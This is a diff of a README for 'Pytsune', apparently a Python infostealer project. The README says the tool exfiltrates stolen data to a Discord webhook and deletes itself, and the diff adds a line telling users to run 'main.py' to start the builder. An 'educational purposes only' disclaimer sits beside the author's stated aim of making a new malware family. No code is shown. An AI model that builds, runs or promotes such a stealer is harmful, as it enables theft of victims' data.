@@ -1,7 +1,7 @@
 # Pytsune
 Advanced stealer written in python, exfiltrating data to a discord webhook, and then deleting itself.
 
--------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
 
 WARNING: This repository contains malware code for educational and research purposes only.
 Do NOT use this code for any unauthorized or illegal activities.
@@ -12,6 +12,8 @@ If you will use it for harm, you agree to the fact that the author of this repos
 
 The purpose of this project was purely my boredom, and me trying to make a new malware family.
 I have tried my best to avoid using generic stealing logic, and actually make my own code for once in my life.
+
+Run "main.py" to start the builder.
 
 ------------------------------------------------------------------------------------------------------------------------------------
 
